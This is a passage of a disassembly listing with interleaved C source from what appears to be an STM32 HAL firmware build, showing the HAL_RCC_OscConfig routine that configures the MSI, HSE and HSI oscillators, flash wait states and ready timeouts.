 80038de:	699b      	ldr	r3, [r3, #24]
 80038e0:	2b00      	cmp	r3, #0
 80038e2:	d101      	bne.n	80038e8 <HAL_RCC_OscConfig+0x64>
      {
        return HAL_ERROR;
 80038e4:	2301      	movs	r3, #1
 80038e6:	e3d9      	b.n	800409c <HAL_RCC_OscConfig+0x818>
      else
      {
        /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
           must be correctly programmed according to the frequency of the CPU clock
           (HCLK) and the supply voltage of the device. */
        if(RCC_OscInitStruct->MSIClockRange > __HAL_RCC_GET_MSI_RANGE())
 80038e8:	687b      	ldr	r3, [r7, #4]
 80038ea:	6a1a      	ldr	r2, [r3, #32]
 80038ec:	4b81      	ldr	r3, [pc, #516]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 80038ee:	681b      	ldr	r3, [r3, #0]
 80038f0:	f003 0308 	and.w	r3, r3, #8
 80038f4:	2b00      	cmp	r3, #0
 80038f6:	d004      	beq.n	8003902 <HAL_RCC_OscConfig+0x7e>
 80038f8:	4b7e      	ldr	r3, [pc, #504]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 80038fa:	681b      	ldr	r3, [r3, #0]
 80038fc:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8003900:	e005      	b.n	800390e <HAL_RCC_OscConfig+0x8a>
 8003902:	4b7c      	ldr	r3, [pc, #496]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003904:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003908:	091b      	lsrs	r3, r3, #4
 800390a:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 800390e:	4293      	cmp	r3, r2
 8003910:	d223      	bcs.n	800395a <HAL_RCC_OscConfig+0xd6>
        {
          /* First increase number of wait states update if necessary */
          if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 8003912:	687b      	ldr	r3, [r7, #4]
 8003914:	6a1b      	ldr	r3, [r3, #32]
 8003916:	4618      	mov	r0, r3
 8003918:	f000 fd8c 	bl	8004434 <RCC_SetFlashLatencyFromMSIRange>
 800391c:	4603      	mov	r3, r0
 800391e:	2b00      	cmp	r3, #0
 8003920:	d001      	beq.n	8003926 <HAL_RCC_OscConfig+0xa2>
          {
            return HAL_ERROR;
 8003922:	2301      	movs	r3, #1
 8003924:	e3ba      	b.n	800409c <HAL_RCC_OscConfig+0x818>
          }

          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003926:	4b73      	ldr	r3, [pc, #460]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003928:	681b      	ldr	r3, [r3, #0]
 800392a:	4a72      	ldr	r2, [pc, #456]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 800392c:	f043 0308 	orr.w	r3, r3, #8
 8003930:	6013      	str	r3, [r2, #0]
 8003932:	4b70      	ldr	r3, [pc, #448]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003934:	681b      	ldr	r3, [r3, #0]
 8003936:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 800393a:	687b      	ldr	r3, [r7, #4]
 800393c:	6a1b      	ldr	r3, [r3, #32]
 800393e:	496d      	ldr	r1, [pc, #436]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003940:	4313      	orrs	r3, r2
 8003942:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003944:	4b6b      	ldr	r3, [pc, #428]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003946:	685b      	ldr	r3, [r3, #4]
 8003948:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 800394c:	687b      	ldr	r3, [r7, #4]
 800394e:	69db      	ldr	r3, [r3, #28]
 8003950:	021b      	lsls	r3, r3, #8
 8003952:	4968      	ldr	r1, [pc, #416]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003954:	4313      	orrs	r3, r2
 8003956:	604b      	str	r3, [r1, #4]
 8003958:	e025      	b.n	80039a6 <HAL_RCC_OscConfig+0x122>
        }
        else
        {
          /* Else, keep current flash latency while decreasing applies */
          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 800395a:	4b66      	ldr	r3, [pc, #408]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 800395c:	681b      	ldr	r3, [r3, #0]
 800395e:	4a65      	ldr	r2, [pc, #404]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003960:	f043 0308 	orr.w	r3, r3, #8
 8003964:	6013      	str	r3, [r2, #0]
 8003966:	4b63      	ldr	r3, [pc, #396]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003968:	681b      	ldr	r3, [r3, #0]
 800396a:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 800396e:	687b      	ldr	r3, [r7, #4]
 8003970:	6a1b      	ldr	r3, [r3, #32]
 8003972:	4960      	ldr	r1, [pc, #384]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003974:	4313      	orrs	r3, r2
 8003976:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003978:	4b5e      	ldr	r3, [pc, #376]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 800397a:	685b      	ldr	r3, [r3, #4]
 800397c:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003980:	687b      	ldr	r3, [r7, #4]
 8003982:	69db      	ldr	r3, [r3, #28]
 8003984:	021b      	lsls	r3, r3, #8
 8003986:	495b      	ldr	r1, [pc, #364]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003988:	4313      	orrs	r3, r2
 800398a:	604b      	str	r3, [r1, #4]

          /* Decrease number of wait states update if necessary */
          /* Only possible when MSI is the System clock source  */
          if(sysclk_source == RCC_CFGR_SWS_MSI)
 800398c:	69bb      	ldr	r3, [r7, #24]
 800398e:	2b00      	cmp	r3, #0
 8003990:	d109      	bne.n	80039a6 <HAL_RCC_OscConfig+0x122>
          {
            if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 8003992:	687b      	ldr	r3, [r7, #4]
 8003994:	6a1b      	ldr	r3, [r3, #32]
 8003996:	4618      	mov	r0, r3
 8003998:	f000 fd4c 	bl	8004434 <RCC_SetFlashLatencyFromMSIRange>
 800399c:	4603      	mov	r3, r0
 800399e:	2b00      	cmp	r3, #0
 80039a0:	d001      	beq.n	80039a6 <HAL_RCC_OscConfig+0x122>
            {
              return HAL_ERROR;
 80039a2:	2301      	movs	r3, #1
 80039a4:	e37a      	b.n	800409c <HAL_RCC_OscConfig+0x818>
            }
          }
        }

        /* Update the SystemCoreClock global variable */
        SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 80039a6:	f000 fc81 	bl	80042ac <HAL_RCC_GetSysClockFreq>
 80039aa:	4602      	mov	r2, r0
 80039ac:	4b51      	ldr	r3, [pc, #324]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 80039ae:	689b      	ldr	r3, [r3, #8]
 80039b0:	091b      	lsrs	r3, r3, #4
 80039b2:	f003 030f 	and.w	r3, r3, #15
 80039b6:	4950      	ldr	r1, [pc, #320]	; (8003af8 <HAL_RCC_OscConfig+0x274>)
 80039b8:	5ccb      	ldrb	r3, [r1, r3]
 80039ba:	f003 031f 	and.w	r3, r3, #31
 80039be:	fa22 f303 	lsr.w	r3, r2, r3
 80039c2:	4a4e      	ldr	r2, [pc, #312]	; (8003afc <HAL_RCC_OscConfig+0x278>)
 80039c4:	6013      	str	r3, [r2, #0]

        /* Configure the source of time base considering new system clocks settings*/
        status = HAL_InitTick(uwTickPrio);
 80039c6:	4b4e      	ldr	r3, [pc, #312]	; (8003b00 <HAL_RCC_OscConfig+0x27c>)
 80039c8:	681b      	ldr	r3, [r3, #0]
 80039ca:	4618      	mov	r0, r3
 80039cc:	f7fd fb86 	bl	80010dc <HAL_InitTick>
 80039d0:	4603      	mov	r3, r0
 80039d2:	73fb      	strb	r3, [r7, #15]
        if(status != HAL_OK)
 80039d4:	7bfb      	ldrb	r3, [r7, #15]
 80039d6:	2b00      	cmp	r3, #0
 80039d8:	d052      	beq.n	8003a80 <HAL_RCC_OscConfig+0x1fc>
        {
          return status;
 80039da:	7bfb      	ldrb	r3, [r7, #15]
 80039dc:	e35e      	b.n	800409c <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Check the MSI State */
      if(RCC_OscInitStruct->MSIState != RCC_MSI_OFF)
 80039de:	687b      	ldr	r3, [r7, #4]
 80039e0:	699b      	ldr	r3, [r3, #24]
 80039e2:	2b00      	cmp	r3, #0
 80039e4:	d032      	beq.n	8003a4c <HAL_RCC_OscConfig+0x1c8>
      {
        /* Enable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_ENABLE();
 80039e6:	4b43      	ldr	r3, [pc, #268]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 80039e8:	681b      	ldr	r3, [r3, #0]
 80039ea:	4a42      	ldr	r2, [pc, #264]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 80039ec:	f043 0301 	orr.w	r3, r3, #1
 80039f0:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 80039f2:	f7fd fbc3 	bl	800117c <HAL_GetTick>
 80039f6:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 80039f8:	e008      	b.n	8003a0c <HAL_RCC_OscConfig+0x188>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 80039fa:	f7fd fbbf 	bl	800117c <HAL_GetTick>
 80039fe:	4602      	mov	r2, r0
 8003a00:	693b      	ldr	r3, [r7, #16]
 8003a02:	1ad3      	subs	r3, r2, r3
 8003a04:	2b02      	cmp	r3, #2
 8003a06:	d901      	bls.n	8003a0c <HAL_RCC_OscConfig+0x188>
          {
            return HAL_TIMEOUT;
 8003a08:	2303      	movs	r3, #3
 8003a0a:	e347      	b.n	800409c <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003a0c:	4b39      	ldr	r3, [pc, #228]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003a0e:	681b      	ldr	r3, [r3, #0]
 8003a10:	f003 0302 	and.w	r3, r3, #2
 8003a14:	2b00      	cmp	r3, #0
 8003a16:	d0f0      	beq.n	80039fa <HAL_RCC_OscConfig+0x176>
          }
        }
         /* Selects the Multiple Speed oscillator (MSI) clock range .*/
        __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003a18:	4b36      	ldr	r3, [pc, #216]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003a1a:	681b      	ldr	r3, [r3, #0]
 8003a1c:	4a35      	ldr	r2, [pc, #212]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003a1e:	f043 0308 	orr.w	r3, r3, #8
 8003a22:	6013      	str	r3, [r2, #0]
 8003a24:	4b33      	ldr	r3, [pc, #204]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003a26:	681b      	ldr	r3, [r3, #0]
 8003a28:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003a2c:	687b      	ldr	r3, [r7, #4]
 8003a2e:	6a1b      	ldr	r3, [r3, #32]
 8003a30:	4930      	ldr	r1, [pc, #192]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003a32:	4313      	orrs	r3, r2
 8003a34:	600b      	str	r3, [r1, #0]
         /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
        __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003a36:	4b2f      	ldr	r3, [pc, #188]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003a38:	685b      	ldr	r3, [r3, #4]
 8003a3a:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003a3e:	687b      	ldr	r3, [r7, #4]
 8003a40:	69db      	ldr	r3, [r3, #28]
 8003a42:	021b      	lsls	r3, r3, #8
 8003a44:	492b      	ldr	r1, [pc, #172]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003a46:	4313      	orrs	r3, r2
 8003a48:	604b      	str	r3, [r1, #4]
 8003a4a:	e01a      	b.n	8003a82 <HAL_RCC_OscConfig+0x1fe>

      }
      else
      {
        /* Disable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_DISABLE();
 8003a4c:	4b29      	ldr	r3, [pc, #164]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003a4e:	681b      	ldr	r3, [r3, #0]
 8003a50:	4a28      	ldr	r2, [pc, #160]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003a52:	f023 0301 	bic.w	r3, r3, #1
 8003a56:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 8003a58:	f7fd fb90 	bl	800117c <HAL_GetTick>
 8003a5c:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 8003a5e:	e008      	b.n	8003a72 <HAL_RCC_OscConfig+0x1ee>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 8003a60:	f7fd fb8c 	bl	800117c <HAL_GetTick>
 8003a64:	4602      	mov	r2, r0
 8003a66:	693b      	ldr	r3, [r7, #16]
 8003a68:	1ad3      	subs	r3, r2, r3
 8003a6a:	2b02      	cmp	r3, #2
 8003a6c:	d901      	bls.n	8003a72 <HAL_RCC_OscConfig+0x1ee>
          {
            return HAL_TIMEOUT;
 8003a6e:	2303      	movs	r3, #3
 8003a70:	e314      	b.n	800409c <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 8003a72:	4b20      	ldr	r3, [pc, #128]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003a74:	681b      	ldr	r3, [r3, #0]
 8003a76:	f003 0302 	and.w	r3, r3, #2
 8003a7a:	2b00      	cmp	r3, #0
 8003a7c:	d1f0      	bne.n	8003a60 <HAL_RCC_OscConfig+0x1dc>
 8003a7e:	e000      	b.n	8003a82 <HAL_RCC_OscConfig+0x1fe>
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 8003a80:	bf00      	nop
        }
      }
    }
  }
  /*------------------------------- HSE Configuration ------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSE) == RCC_OSCILLATORTYPE_HSE)
 8003a82:	687b      	ldr	r3, [r7, #4]
 8003a84:	681b      	ldr	r3, [r3, #0]
 8003a86:	f003 0301 	and.w	r3, r3, #1
 8003a8a:	2b00      	cmp	r3, #0
 8003a8c:	d073      	beq.n	8003b76 <HAL_RCC_OscConfig+0x2f2>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSE(RCC_OscInitStruct->HSEState));

    /* When the HSE is used as system clock or clock source for PLL in these cases it is not allowed to be disabled */
    if((sysclk_source == RCC_CFGR_SWS_HSE) ||
 8003a8e:	69bb      	ldr	r3, [r7, #24]
 8003a90:	2b08      	cmp	r3, #8
 8003a92:	d005      	beq.n	8003aa0 <HAL_RCC_OscConfig+0x21c>
 8003a94:	69bb      	ldr	r3, [r7, #24]
 8003a96:	2b0c      	cmp	r3, #12
 8003a98:	d10e      	bne.n	8003ab8 <HAL_RCC_OscConfig+0x234>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSE)))
 8003a9a:	697b      	ldr	r3, [r7, #20]
 8003a9c:	2b03      	cmp	r3, #3
 8003a9e:	d10b      	bne.n	8003ab8 <HAL_RCC_OscConfig+0x234>
    {
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003aa0:	4b14      	ldr	r3, [pc, #80]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003aa2:	681b      	ldr	r3, [r3, #0]
 8003aa4:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003aa8:	2b00      	cmp	r3, #0
 8003aaa:	d063      	beq.n	8003b74 <HAL_RCC_OscConfig+0x2f0>
 8003aac:	687b      	ldr	r3, [r7, #4]
 8003aae:	685b      	ldr	r3, [r3, #4]
 8003ab0:	2b00      	cmp	r3, #0
 8003ab2:	d15f      	bne.n	8003b74 <HAL_RCC_OscConfig+0x2f0>
      {
        return HAL_ERROR;
 8003ab4:	2301      	movs	r3, #1
 8003ab6:	e2f1      	b.n	800409c <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Set the new HSE configuration ---------------------------------------*/
      __HAL_RCC_HSE_CONFIG(RCC_OscInitStruct->HSEState);
 8003ab8:	687b      	ldr	r3, [r7, #4]
 8003aba:	685b      	ldr	r3, [r3, #4]
 8003abc:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8003ac0:	d106      	bne.n	8003ad0 <HAL_RCC_OscConfig+0x24c>
 8003ac2:	4b0c      	ldr	r3, [pc, #48]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003ac4:	681b      	ldr	r3, [r3, #0]
 8003ac6:	4a0b      	ldr	r2, [pc, #44]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003ac8:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003acc:	6013      	str	r3, [r2, #0]
 8003ace:	e025      	b.n	8003b1c <HAL_RCC_OscConfig+0x298>
 8003ad0:	687b      	ldr	r3, [r7, #4]
 8003ad2:	685b      	ldr	r3, [r3, #4]
 8003ad4:	f5b3 2fa0 	cmp.w	r3, #327680	; 0x50000
 8003ad8:	d114      	bne.n	8003b04 <HAL_RCC_OscConfig+0x280>
 8003ada:	4b06      	ldr	r3, [pc, #24]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003adc:	681b      	ldr	r3, [r3, #0]
 8003ade:	4a05      	ldr	r2, [pc, #20]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003ae0:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 8003ae4:	6013      	str	r3, [r2, #0]
 8003ae6:	4b03      	ldr	r3, [pc, #12]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003ae8:	681b      	ldr	r3, [r3, #0]
 8003aea:	4a02      	ldr	r2, [pc, #8]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 8003aec:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003af0:	6013      	str	r3, [r2, #0]
 8003af2:	e013      	b.n	8003b1c <HAL_RCC_OscConfig+0x298>
 8003af4:	40021000 	.word	0x40021000
 8003af8:	0800d160 	.word	0x0800d160
 8003afc:	20000000 	.word	0x20000000
 8003b00:	20000004 	.word	0x20000004
 8003b04:	4ba0      	ldr	r3, [pc, #640]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003b06:	681b      	ldr	r3, [r3, #0]
 8003b08:	4a9f      	ldr	r2, [pc, #636]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003b0a:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8003b0e:	6013      	str	r3, [r2, #0]
 8003b10:	4b9d      	ldr	r3, [pc, #628]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003b12:	681b      	ldr	r3, [r3, #0]
 8003b14:	4a9c      	ldr	r2, [pc, #624]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003b16:	f423 2380 	bic.w	r3, r3, #262144	; 0x40000
 8003b1a:	6013      	str	r3, [r2, #0]

      /* Check the HSE State */
      if(RCC_OscInitStruct->HSEState != RCC_HSE_OFF)
 8003b1c:	687b      	ldr	r3, [r7, #4]
 8003b1e:	685b      	ldr	r3, [r3, #4]
 8003b20:	2b00      	cmp	r3, #0
 8003b22:	d013      	beq.n	8003b4c <HAL_RCC_OscConfig+0x2c8>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003b24:	f7fd fb2a 	bl	800117c <HAL_GetTick>
 8003b28:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003b2a:	e008      	b.n	8003b3e <HAL_RCC_OscConfig+0x2ba>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003b2c:	f7fd fb26 	bl	800117c <HAL_GetTick>
 8003b30:	4602      	mov	r2, r0
 8003b32:	693b      	ldr	r3, [r7, #16]
 8003b34:	1ad3      	subs	r3, r2, r3
 8003b36:	2b64      	cmp	r3, #100	; 0x64
 8003b38:	d901      	bls.n	8003b3e <HAL_RCC_OscConfig+0x2ba>
          {
            return HAL_TIMEOUT;
 8003b3a:	2303      	movs	r3, #3
 8003b3c:	e2ae      	b.n	800409c <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003b3e:	4b92      	ldr	r3, [pc, #584]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003b40:	681b      	ldr	r3, [r3, #0]
 8003b42:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003b46:	2b00      	cmp	r3, #0
 8003b48:	d0f0      	beq.n	8003b2c <HAL_RCC_OscConfig+0x2a8>
 8003b4a:	e014      	b.n	8003b76 <HAL_RCC_OscConfig+0x2f2>
        }
      }
      else
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003b4c:	f7fd fb16 	bl	800117c <HAL_GetTick>
 8003b50:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003b52:	e008      	b.n	8003b66 <HAL_RCC_OscConfig+0x2e2>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003b54:	f7fd fb12 	bl	800117c <HAL_GetTick>
 8003b58:	4602      	mov	r2, r0
 8003b5a:	693b      	ldr	r3, [r7, #16]
 8003b5c:	1ad3      	subs	r3, r2, r3
 8003b5e:	2b64      	cmp	r3, #100	; 0x64
 8003b60:	d901      	bls.n	8003b66 <HAL_RCC_OscConfig+0x2e2>
          {
            return HAL_TIMEOUT;
 8003b62:	2303      	movs	r3, #3
 8003b64:	e29a      	b.n	800409c <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003b66:	4b88      	ldr	r3, [pc, #544]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003b68:	681b      	ldr	r3, [r3, #0]
 8003b6a:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003b6e:	2b00      	cmp	r3, #0
 8003b70:	d1f0      	bne.n	8003b54 <HAL_RCC_OscConfig+0x2d0>
 8003b72:	e000      	b.n	8003b76 <HAL_RCC_OscConfig+0x2f2>
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003b74:	bf00      	nop
        }
      }
    }
  }
  /*----------------------------- HSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI) == RCC_OSCILLATORTYPE_HSI)
 8003b76:	687b      	ldr	r3, [r7, #4]
 8003b78:	681b      	ldr	r3, [r3, #0]
 8003b7a:	f003 0302 	and.w	r3, r3, #2
 8003b7e:	2b00      	cmp	r3, #0
 8003b80:	d060      	beq.n	8003c44 <HAL_RCC_OscConfig+0x3c0>
    /* Check the parameters */
    assert_param(IS_RCC_HSI(RCC_OscInitStruct->HSIState));
    assert_param(IS_RCC_HSI_CALIBRATION_VALUE(RCC_OscInitStruct->HSICalibrationValue));

    /* Check if HSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_HSI) ||
 8003b82:	69bb      	ldr	r3, [r7, #24]
 8003b84:	2b04      	cmp	r3, #4
 8003b86:	d005      	beq.n	8003b94 <HAL_RCC_OscConfig+0x310>
 8003b88:	69bb      	ldr	r3, [r7, #24]
 8003b8a:	2b0c      	cmp	r3, #12
 8003b8c:	d119      	bne.n	8003bc2 <HAL_RCC_OscConfig+0x33e>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSI)))
 8003b8e:	697b      	ldr	r3, [r7, #20]
 8003b90:	2b02      	cmp	r3, #2
 8003b92:	d116      	bne.n	8003bc2 <HAL_RCC_OscConfig+0x33e>
    {
      /* When HSI is used as system clock it will not be disabled */
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003b94:	4b7c      	ldr	r3, [pc, #496]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003b96:	681b      	ldr	r3, [r3, #0]
 8003b98:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003b9c:	2b00      	cmp	r3, #0
 8003b9e:	d005      	beq.n	8003bac <HAL_RCC_OscConfig+0x328>
 8003ba0:	687b      	ldr	r3, [r7, #4]
 8003ba2:	68db      	ldr	r3, [r3, #12]
 8003ba4:	2b00      	cmp	r3, #0
 8003ba6:	d101      	bne.n	8003bac <HAL_RCC_OscConfig+0x328>
      {
        return HAL_ERROR;
 8003ba8:	2301      	movs	r3, #1
 8003baa:	e277      	b.n	800409c <HAL_RCC_OscConfig+0x818>
      }
      /* Otherwise, just the calibration is allowed */
      else
      {
        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003bac:	4b76      	ldr	r3, [pc, #472]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003bae:	685b      	ldr	r3, [r3, #4]
 8003bb0:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003bb4:	687b      	ldr	r3, [r7, #4]
 8003bb6:	691b      	ldr	r3, [r3, #16]
 8003bb8:	061b      	lsls	r3, r3, #24
 8003bba:	4973      	ldr	r1, [pc, #460]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003bbc:	4313      	orrs	r3, r2
 8003bbe:	604b      	str	r3, [r1, #4]
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003bc0:	e040      	b.n	8003c44 <HAL_RCC_OscConfig+0x3c0>
      }
    }
    else
    {
      /* Check the HSI State */
      if(RCC_OscInitStruct->HSIState != RCC_HSI_OFF)
 8003bc2:	687b      	ldr	r3, [r7, #4]
 8003bc4:	68db      	ldr	r3, [r3, #12]
 8003bc6:	2b00      	cmp	r3, #0
 8003bc8:	d023      	beq.n	8003c12 <HAL_RCC_OscConfig+0x38e>
      {
        /* Enable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_ENABLE();
 8003bca:	4b6f      	ldr	r3, [pc, #444]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003bcc:	681b      	ldr	r3, [r3, #0]
 8003bce:	4a6e      	ldr	r2, [pc, #440]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003bd0:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003bd4:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003bd6:	f7fd fad1 	bl	800117c <HAL_GetTick>
 8003bda:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003bdc:	e008      	b.n	8003bf0 <HAL_RCC_OscConfig+0x36c>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003bde:	f7fd facd 	bl	800117c <HAL_GetTick>
 8003be2:	4602      	mov	r2, r0
 8003be4:	693b      	ldr	r3, [r7, #16]
 8003be6:	1ad3      	subs	r3, r2, r3
 8003be8:	2b02      	cmp	r3, #2
 8003bea:	d901      	bls.n	8003bf0 <HAL_RCC_OscConfig+0x36c>
          {
            return HAL_TIMEOUT;
 8003bec:	2303      	movs	r3, #3
 8003bee:	e255      	b.n	800409c <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003bf0:	4b65      	ldr	r3, [pc, #404]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003bf2:	681b      	ldr	r3, [r3, #0]
 8003bf4:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003bf8:	2b00      	cmp	r3, #0
 8003bfa:	d0f0      	beq.n	8003bde <HAL_RCC_OscConfig+0x35a>
          }
        }

        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
